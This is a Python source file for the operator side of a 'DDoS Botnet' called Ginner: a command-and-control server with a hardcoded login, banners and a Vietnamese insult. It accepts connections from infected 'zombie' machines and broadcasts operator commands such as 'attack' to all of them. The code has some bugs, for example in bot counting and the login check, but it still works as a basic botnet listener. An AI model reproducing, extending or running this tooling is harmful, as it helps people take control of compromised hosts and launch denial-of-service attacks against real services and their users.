import sys
from sys import platform
import os
import socket
import subprocess
import time
from time import sleep
import colorama
from colorama import Style, Fore 
import threading as thread
import _thread


osystem = sys.platform

if osystem == "linux":
    os.system("clear")

else:
    os.system("cls")
 
 
welcome ="""
        Welcome to Ginner bot
------------------------------------------
"""

for i in welcome:
        time.sleep(0.1)
        print(i, end='',flush=True)

print()
print()
username = input("Enter the username: ")
passw =input("Enter the password: ")

if username != "hphong" and passw != "hphongdzaicudaim2":
    time.sleep(1)
    print(Fore.RED+"[-] Access Denied")
    sys.exit()
     
else:
    time.sleep(1)
    print(Fore.LIGHTGREEN_EX+"[+] Login Accepted")
    pass

time.sleep(1.7)
if osystem == "linux":
    os.system("clear")

else:
    os.system("cls")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("""
Ginner

DDoS Botnet

Địt mẹ thằng skid trộm code :D""")

time.sleep(1.3)
os.system("clear")
print(Fore.RED+"""

##__________________­___​#### 

#####_______________­_​#####

######______________­​######

_#######____________­​######

___########________​#­######

____#########_____​##­#####

______########____​##­#####

_______#########__​##­#### 

___________######_​##­###___​

______________######­##____​

________############­#_____​

______##############­##___​

_____###(⓿)#########­###___​

____################­###___​

___#################­###__​

____################­###___​

_____###############­##____​

_________##########_­______​

________############­#____

Author : vilgax
""")

print(Fore.BLUE + "DDoS Botnet By Vilgax :D ")
print()
listclientes = []



def zombies():
    
    bots = 0 
    for bots in listclientes:
        bots =+1
        print(f"[+] Bots: {bots}")




def clientes(client_addr):
     
    
    print(Fore.BLUE + f"[+] {client_addr[0]} | Just connected to Kuzuma")
    print()
    while True:
        comm = input(f"{Fore.RED}roott@ginner >> {Fore.RESET}")
        if comm == "":
            pass

        if comm.startswith ("attack"):
            attack()
        if comm == "bots":
            zombies()

        if comm == " ":
            pass
        if comm == ".":
            pass

        if comm == "exit":
            for bots in listclientes:
                comm = comm.encode()
                bots.send(comm)
                salida()
             

            

 
        for bots in listclientes:
            comm = comm.encode()
            bots.send(comm)

        

def salida():
    print("[+] Bots in listening again, thanks for using Ginner :D  ")
    print("[*] Press CTRL-C to close the program!")
            
        


def attack():
    print(f"[+] Order sent to all zombies, be patient!")
def crtserver():
    global server
    from colorama import Style, Fore 
    lhost = input(Fore.RED + Style.BRIGHT + "[+] Enter server IP: " )
    print()
    lport = int(input("[+] Enter server port: "))
    #lport = 4444

    

    if lhost == "":
        lhost == 'localhost'
        pass

    try:

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((lhost, lport))
        server.listen()
        print()
        print("[+] Waiting For Bots Handshake...")
    except KeyboardInterrupt:
        server.close()
         
        

     
    while True:
        try:
            clientt, client_addr = server.accept()
            _thread.start_new_thread(clientes, (client_addr,))
            listclientes.append(clientt)
            try:

                output = clientt.recv(1024)
                output = output.decode()
                print(f"""
                {output}""")
                 
            except:
                pass


        except KeyboardInterrupt:
            print()
            print("Byee!")
            server.close()
            break
 

crtserver() 

 

